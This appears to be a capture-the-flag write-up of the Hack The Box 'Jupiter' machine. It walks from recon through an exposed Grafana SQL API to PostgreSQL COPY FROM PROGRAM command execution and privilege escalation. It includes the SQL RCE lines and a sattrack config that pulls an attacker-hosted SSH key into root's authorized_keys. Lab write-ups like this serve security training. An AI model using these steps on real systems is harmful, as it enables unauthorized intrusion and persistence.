---
title: Jupiter Report
date: 2023-09-09 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Medium, PostgreSQL]

img_path: /assets/img/htb/writeups/jupiter
---

## **Information gathering**

* * *
* * *

**Scope:** 10.10.11.216/32 (Linux)

**TCP Nmap scan:** 65,535 ports

![](nmap_all_ports_TCP.png)

* **Open ports**:
	* **22/ssh**:
		* Banner grabbing
			* Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
				* [OpenSSH 9.4](https://www.openssh.com/txt/release-9.4)/[9.4p1](https://www.openssh.com/txt/release-9.4) (2023-08-10)
			* Codename: jammy [codename.py](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/testing_tools/codename.py)
			* CVEs Version: [https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:8.9p1](https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:8.9p1)
		* Valid credentials: None
	
	 * **80/http**:
		* Banner grabbing
			![](http_banner_grabbing_nc.png)
			* Resolving to Local DNS server: http://jupiter.htb
				![](http_banner_grabbing_ww.png.png)
				* Firefox
					![](http_firefox_home_page.png)
				* Technologies
					* HttpServer: Nginx/1.18.0 (Ubuntu/Linux)
						* Version vulns: [https://www.cybersecurity-help.cz/vdb/nginx/nginx/1.18.0/](https://www.cybersecurity-help.cz/vdb/nginx/nginx/1.18.0/)
						* Stable version: 1.24.0 [https://nginx.org/en/download.html](https://nginx.org/en/download.html)
					* JQuery/3.3.1
						* Version vulns: [https://security.snyk.io/package/npm/jquery/3.3.1](https://security.snyk.io/package/npm/jquery/3.3.1)
						* Stable version: 3.7.0 (May 11, 2023)
			* Url Scrapping
				![](http_basic_url_scrapping_curl.png)
			* Subdomain enumeration
				![](subdomain_enumeration.png)
				* New subdomain: http://kiosk.jupiter.htb
					* Firefox (Moons and some tables)
					![](http_kiosk_subdomain_home_page.png)
					* Technologies
						* [Grafana v9.5.2](https://grafana.com/docs/grafana/v9.5/) (open source analytics & monitoring solution for every database)
							* Version vulns: None
							* Stable version: 10.1.1 [https://grafana.com/grafana/download](https://grafana.com/grafana/download)
							* **API**: [https://grafana.com/docs/grafana/latest/developers/http_api/](https://grafana.com/docs/grafana/latest/developers/http_api/)
						* Go 1.20.4
						* Angular 1.8.3
						* PostgreSQL 

## **Vulnerability Assesment**

* * *
* * *

* Burpsuite proxy (home)
	![](http_kiosk_api_query.png)
	* Exposed Grafana API query (postgres):
		* Version: select version() [PostgreSQL 14.8]
			* Credentials: grafana_viewer:SCRAM-SHA-256\$4096:K9IJE4h9f9+tr7u7AZL76w\==\$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=
			* Current user: **grafana_viewer**
			* Permisions query: SELECT current_setting('is_superuser'); = on
				* **When can read wiles or execute commands**
				![](super_user_priv.png)
				+ Postgres roles: [https://www.postgresql.org/docs/current/role-attributes.html](https://www.postgresql.org/docs/current/role-attributes.html)
				+ Postgres pentesting: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-with-postgresql-languages](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-with-postgresql-languages)

## **Exploitation**

* * *
* * *

* PostgreSQLi
	* DROP TABLE IF EXISTS cmd_rce;
	* CREATE TABLE cmd_rce(cmd_out text);
	* COPY cmd_rce FROM PROGRAM 'id';
	* SELECT * FROM cmd_rce;
		![](postgrsql_poc.png)

## **Post-exploitation**

* * *
* * *

* System User Shell (postgress)
	* Enumeration
		* Process (pspy.sh)
			* Juno user cron job
			![](pspy_process.png)
			* Shadow simulation (/home/juno/shadow-simulation.sh)			
				![](shadow_simulation_mean.png)
				* [Shadow](https://shadow.github.io/docs/guide/design_2x.html) directly **executes real, unmodified application binaries natively in Linux as standard OS processes** (using `vfork()` and `execvpe()`): we call these processes executed by Shadow _managed processes_.
				* Example: (Basic File Transfer)
					![](shadow_simulation.png)
				* We have write access to **network-simulation.yml** (-rw-rw-rw- 1 juno juno 815 Mar  7  2023 /dev/shm/network-simulation.yml)
* Juno user
	* Enumeration
		* Process (jovian   /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb)
		* Juno group: science
			* Group permissions: drwxrwx--- 4 jovian **science** 4096 May  4 18:59 /opt/solar-flares
		* Jupyter Notebook is running on default port 8888
			* Access with Local Port Forwarding in SSH
				* Access token Enabled
			* Searchings recent logs  (**Token leaked**)
				![](token_logs.png)
			* Jovian JUpyter Notebookacces (Free Remote code execution)
* Jovian user
	* Enumeration
		* Binary execution policy ((ALL) NOPASSWD: /usr/local/bin/sattrack)
			* [Sattrack](https://github.com/arf20/arftracksat): Satellite tracking software for linux
			* Documentation options
				![](sattrack_docs.png)
				* tlesources:  A array of URLs to curl get into tleroot
				* tleroot: Location to get and load TLE files
				* tlefile: TLE filename to load from tleroot

## **Lateral movement**

* * *
* * *

* Pivot to **Juno user** (network-simulation.yml)
	![](juno_config_suid.png)
	![](juno_shell.png)
	* Add our id_rsa.pub to juno authorized keys nad log with ssh (Persistence)
* Pivot user Jovian (Jupyter notebook access)
	![](jupyter_notebook_rce.png)
	![](jovian_shell.png)
* Pivot to Root
	* Request our id_rsa.pub to root authorized_keys file
		*  tlesources:  http://10.10.15.5/id_rsa.pub
		* tleroot: /root/.ssh
		* tlefile: authorized_keys
		![](sattrack_conf.png)
		![](root.png)

## **Proof of concept**

* * *
* * *

* Postgres RCE script [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Jupiter)
	![](postres_shell.png)
* Juno RCE .yaml
	
	![](network_yml_poc.png)
	![](juno_rce_poc.png)
